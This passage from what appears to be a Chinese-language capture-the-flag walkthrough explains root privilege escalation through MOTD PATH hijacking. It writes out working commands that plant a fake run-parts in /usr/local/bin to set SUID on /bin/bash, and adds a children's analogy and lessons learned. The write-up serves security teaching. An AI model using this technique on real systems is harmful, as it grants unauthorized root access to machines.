Phase 2

权限提升：staff 组 + MOTD PATH 劫持

jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=...,50(staff),...

pspy 观察 SSH 登录时 root 的行为

CMD: UID=0 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
🧒 儿童版 — 假保安先上岗 系统在你 SSH 登录时，root 会执行 run-parts 来生成欢迎信息。系统找程序时按 PATH 顺序找——先在 /usr/local/bin 找。jkr 作为 staff 组成员可以写入 /usr/local/bin/！放一个假的 run-parts 在那里，root 就会先找到并执行它。就像在公司前台放了个假保安，真保安还没来，假保安就先上岗了。

PATH 劫持

jkr@writeup:~$ echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
jkr@writeup:~$ chmod +x /usr/local/bin/run-parts

# 另一个终端 SSH 登录触发 MOTD
$ ssh jkr@10.129.28.241

# 回到原终端
jkr@writeup:~$ /bin/bash -p
bash-4.4# cat /root/root.txt

知识点总结

有 DoS 防护 = 不能暴力扫目录。

优先检查 robots.txt、页面源码、已知路径。

staff 组在 Debian 系统中有特殊权限。

可以写入 /usr/local/bin 和 /usr/local/sbin。这两个目录在 PATH 中排在系统目录前面，天然适合 PATH 劫持。

MOTD + PATH 劫持是提权利器。

SSH 登录时 root 执行的命令如果在 PATH 中可被劫持，就能提权。用 pspy 监控 root 行为是发现这类路径的关键。
